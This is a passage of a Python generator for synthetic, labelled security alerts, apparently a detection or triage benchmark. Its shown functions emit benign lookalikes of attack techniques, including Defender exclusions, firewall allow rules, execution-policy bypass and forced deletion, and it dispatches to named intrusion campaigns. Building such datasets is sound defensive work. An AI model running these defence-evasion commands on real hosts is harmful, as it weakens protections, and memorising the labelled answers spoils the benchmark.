        g.emit(t, it, "91805", A.script_block(ctx, it, t, text="Get-ADComputer -Filter 'OperatingSystem -like \"*Windows 10*\"' -Properties LastLogonDate | Export-Csv C:\\IT\\reports\\stale.csv",
                                              path="C:\\IT\\scripts\\Get-StaleComputers.ps1"),
               lookalike("lookalike:it-admin", "monthly stale-computer report", "T1018"))
    elif kind == 2:
        target = pick(g.rng, WORKSTATIONS)
        g.emit(t, target, "61138", A.service_installed(ctx, target, t, name="PSEXESVC", image="%SystemRoot%\\PSEXESVC.exe"),
               lookalike("lookalike:it-admin", f"desktop support runs PsExec against {target.name}", "T1569.002"))
    elif kind == 3:
        target = pick(g.rng, WORKSTATIONS)
        cmd = "gpupdate /force"
        g.emit(t, target, "92068", A.process(ctx, target, t, image=r"C:\Windows\System32\gpupdate.exe", cmd=cmd,
                                             parent=r"C:\Windows\PSEXESVC.exe", parent_cmd=r"C:\Windows\PSEXESVC.exe",
                                             user="SYSTEM", integrity="System"),
               lookalike("lookalike:it-admin", "desktop support forces a policy refresh with PsExec", "T1569.002"),
               description=f"PSEXEC was used to execute: {cmd}")
    elif kind == 4:
        host = pick(g.rng, WORKSTATIONS)
        script = "C:\\Windows\\Temp\\PSAppDeployToolkit\\Deploy-Application.ps1"
        g.emit(t, host, "92200", A.file_create(ctx, host, t, image=CCMEXEC, target=script, user="SYSTEM"),
               lookalike("lookalike:it-admin", "SCCM stages an application deployment script", "T1059.001"))
    elif kind == 5:
        host = pick(g.rng, WORKSTATIONS)
        cmd = f"{PS} -NoProfile -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\PSAppDeployToolkit\\Deploy-Application.ps1 -DeployMode Silent"
        g.emit(t, host, "92029", A.process(ctx, host, t, image=PS, cmd=cmd, parent=CCMEXEC, parent_cmd=CCMEXEC,
                                           user="SYSTEM", integrity="System"),
               lookalike("lookalike:it-admin", "SCCM runs a packaged installer script", "T1059.001"))
    elif kind == 6:
        host = pick(g.rng, WORKSTATIONS)
        cmd = f"{PS} -c Remove-Item -Path C:\\Windows\\Temp\\* -Recurse -Force -ErrorAction SilentlyContinue"
        g.emit(t, host, "92021", A.process(ctx, host, t, image=PS, cmd=cmd, parent=SVCHOST, parent_cmd=f"{SVCHOST} -k netsvcs -p -s Schedule",
                                           user="SYSTEM", integrity="System"),
               lookalike("lookalike:it-admin", "scheduled temp-folder cleanup", "T1070.004"))
    elif kind == 7:
        host = pick(g.rng, WORKSTATIONS)
        fw = 'netsh  advfirewall firewall add rule name="Zoom Video Conference" dir=in action=allow program="C:\\Program Files\\Zoom\\bin\\Zoom.exe"'
        g.emit(t, host, "92043", A.process(ctx, host, t, image=r"C:\Windows\System32\netsh.exe", cmd=fw, parent=MSIEXEC,
                                           parent_cmd=f"{MSIEXEC} /V", user="SYSTEM", integrity="System"),
               lookalike("lookalike:it-admin", "installer adds its own firewall exception", "T1562.004"))
    elif kind == 8:
        host = HOSTS["build-01"] if g.maybe(0.3) else pick(g.rng, WIN_SERVERS)
        if host.os == "linux":
            host = HOSTS["SRV-APP-02"]
        cmd = f"{PS} -c Set-MpPreference -ExclusionPath 'D:\\BuildAgent\\work'"
        g.emit(t, host, "92007", A.process(ctx, host, t, image=PS, cmd=cmd, parent=CMD, parent_cmd=CMD,
                                           user=pick(g.rng, WIN_ADMINS), integrity="High"),
               lookalike("lookalike:it-admin", "approved Defender exclusion for the build agent work folder", "T1562.001"))
    else:
        host = pick(g.rng, WORKSTATIONS)
        g.emit(t, host, "92052", A.process(ctx, host, t, image=CMD, cmd=f"{CMD} /c \"C:\\Windows\\CCM\\SystemTemp\\inventory.cmd\"",
                                           parent=CCMEXEC, parent_cmd=CCMEXEC, user="SYSTEM", integrity="System"),
               lookalike("lookalike:it-admin", "SCCM hardware inventory batch file", "T1059.003"))


def web_noise(g: Gen) -> None:
    host = pick(g.rng, WEB)
    t = g.at(g.rng.randrange(DAYS), 6, 23)
    client = f"10.20.1.{g.rng.randrange(20, 130)}" if g.maybe(0.3) else f"192.0.2.{g.rng.randrange(1, 254)}"
    ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15"
    kind = g.rng.randrange(3)
    if kind == 0:
        g.emit(t, host, "31120", A.access_log(host, t, src_ip=client, method="POST", url="/api/v2/orders", status=500, size=97,
                                              agent=ua, referer="https://shop.example.com/checkout"),
               noise("noise:web", "checkout API fails after a deploy (HTTP 500)"))
    elif kind == 1:
        g.emit(t, host, "31101", A.access_log(host, t, src_ip=client, method="GET", url="/static/js/app.3f9c1.js.map",
                                              status=404, size=153, agent=ua),
               noise("noise:web", "browser asks for a source map that is not deployed"))
    else:
        g.emit(t, host, "31509", A.access_log(host, t, src_ip=client, method="POST", url="/wp-login.php", status=302,
                                              size=0, agent=ua, referer="https://blog.example.com/wp-login.php"),
               noise("noise:web", "an editor signs in to the company blog"))


def defender_routine(g: Gen) -> None:
    host = pick(g.rng, WORKSTATIONS + WIN_SERVERS)
    t = g.at(g.rng.randrange(DAYS), 11, 13)
    g.emit(t, host, "62107", A.defender(g.ctx, host, t, 1000, {"scan Type": "Antimalware", "scan Parameters": "Quick Scan",
                                                               "domain": "NT AUTHORITY", "user": "SYSTEM"}),
           noise("noise:defender", "scheduled Defender quick scan starts"))


def smb_file_access(g: Gen) -> None:
    ws = pick(g.rng, WORKSTATIONS)
    fs = HOSTS["SRV-FS-01"]
    t = g.at(g.workday(), 8, 18)
    g.emit(t, ws, "92106", A.network(g.ctx, ws, t, image="System", user="SYSTEM", dst_ip=fs.ip, dst_port=445,
                                     dst_host=fs.fqdn, port_name="microsoft-ds"),
           lookalike("lookalike:file-share", f"{ws.owner} opens the team share", "T1021.002"))


def build_server(g: Gen) -> None:
    host = HOSTS["build-01"]
    t = g.at(g.workday(), 8, 20)
    build = f"/tmp/pip-build-env-{g.ctx.b64(8).lower()}"
    g.emit(t, host, "92601", A.audit_execve(g.ctx, host, t, argv=["/usr/bin/python3", f"{build}/overlay/setup.py", "bdist_wheel"],
                                            exe="/usr/bin/python3.12", uid=0, auid=1006, cwd=build),
           lookalike("lookalike:ci", "pip builds a wheel in an isolated /tmp environment", "T1059.006"))


NOISE: Tuple[Tuple[Callable[[Gen], None], int], ...] = (
    (admin_ssh, 30), (admin_sudo, 26), (ssh_typo, 8), (windows_logons, 30), (logon_typo, 10), (stale_credentials, 10),
    (account_lifecycle, 14), (windows_patching, 34), (linux_patching, 20), (scanner, 22), (backups, 16),
    (config_management, 24), (monitoring, 8), (it_admin_windows, 26), (web_noise, 14), (defender_routine, 8),
    (smb_file_access, 6), (build_server, 6),
)

CAMPAIGNS: Tuple[Tuple[str, int], ...] = (
    ("office_macro_intrusion", 4), ("lateral_ransomware", 2), ("ssh_bruteforce_persistence", 2),
    ("web_exploitation", 2), ("kerberoast", 2), ("uac_wmi_persistence", 2), ("lolbin_download", 2),
    ("linux_cryptominer", 2), ("password_spray", 2), ("local_admin_backdoor", 2), ("collection_exfil", 2),
)


def run_campaigns(g: Gen) -> None:
    """Every campaign in :data:`CAMPAIGNS`, each instance on its own hosts and start time."""
    workstations: List[Host] = list(WORKSTATIONS)
    g.rng.shuffle(workstations)
    linux: List[Host] = list(LINUX_SERVERS)
    for name, count in CAMPAIGNS:
        for i in range(count):
            t = g.at(g.workday(), 6, 20)
            ws = workstations[(i + len(name)) % len(workstations)]
            if name == "office_macro_intrusion":
                office_macro_intrusion(g, workstations[i % len(workstations)], t)
            elif name == "lateral_ransomware":
                lateral_ransomware(g, ws, (HOSTS["SRV-FS-01"], HOSTS["SRV-APP-02"])[i % 2], t)
            elif name == "ssh_bruteforce_persistence":
                ssh_bruteforce_persistence(g, (HOSTS["bastion-01"], HOSTS["app-01"])[i % 2], t)
            elif name == "web_exploitation":
                web_exploitation(g, WEB[i % len(WEB)], t)
            elif name == "kerberoast":
                kerberoast(g, ws, t)
            elif name == "uac_wmi_persistence":
                uac_wmi_persistence(g, ws, t)
            elif name == "lolbin_download":
                lolbin_download(g, ws, t)
            elif name == "linux_cryptominer":
                linux_cryptominer(g, pick(g.rng, linux), t)
            elif name == "password_spray":
                password_spray(g, ws, t)
            elif name == "local_admin_backdoor":
                local_admin_backdoor(g, (ws, pick(g.rng, WIN_SERVERS))[i % 2], t)
            elif name == "collection_exfil":
                collection_exfil(g, ws, t)
            else:  # pragma: no cover - the table above lists every campaign
                raise KeyError(name)


def generate(seed: int, *, malicious: int, benign: int) -> List[Draft]:
    """Campaigns, then single atomic runs up to ``malicious`` alerts, then benign activity up to ``benign``."""
    g = Gen(seed)
    run_campaigns(g)
    if len(g.drafts) > malicious:
        raise ValueError(f"the campaigns alone produce {len(g.drafts)} malicious alerts, more than {malicious}")
    while len(g.drafts) < malicious:
        single_atomic(g)
    funcs: Sequence[Callable[[Gen], None]] = [f for f, _ in NOISE]
    weights: Sequence[int] = [w for _, w in NOISE]
    while len(g.drafts) < malicious + benign:
        g.rng.choices(funcs, weights)[0](g)
    return g.drafts


__all__ = ["DAYS", "START", "Draft", "Truth", "generate"]
